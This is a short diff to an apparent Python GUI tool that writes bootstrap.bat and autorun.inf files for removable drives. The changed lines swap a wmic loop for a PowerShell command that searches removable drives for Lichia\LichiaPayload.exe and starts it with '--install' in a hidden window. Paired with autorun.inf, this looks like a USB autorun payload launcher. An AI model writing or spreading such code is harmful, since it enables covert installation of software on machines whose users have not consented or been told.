@@ -245,10 +245,11 @@ class App(tk.Tk):
             json.dumps(cfg, indent=2), encoding="utf-8")
         (root / "bootstrap.bat").write_text(
             '@echo off\r\n'
-            'for /f "tokens=*" %%a in (\'wmic logicaldisk where drivetype^=2 '
-            'get caption ^| find ":"\') do @if exist "%%a\\Lichia\\'
-            'LichiaPayload.exe" start "" /min "%%a\\Lichia\\LichiaPayload.exe"'
-            ' --install\r\n',
+            'powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk '
+            '-Filter \'DriveType=2\' | ForEach-Object { $p = Join-Path '
+            '$_.Caption \'Lichia\\LichiaPayload.exe\'; if (Test-Path $p) '
+            '{ Start-Process -FilePath $p -ArgumentList \'--install\' '
+            '-WindowStyle Hidden } }"\r\n',
             encoding="utf-8")
         (root / "autorun.inf").write_text(
             "[Autorun]\r\n"
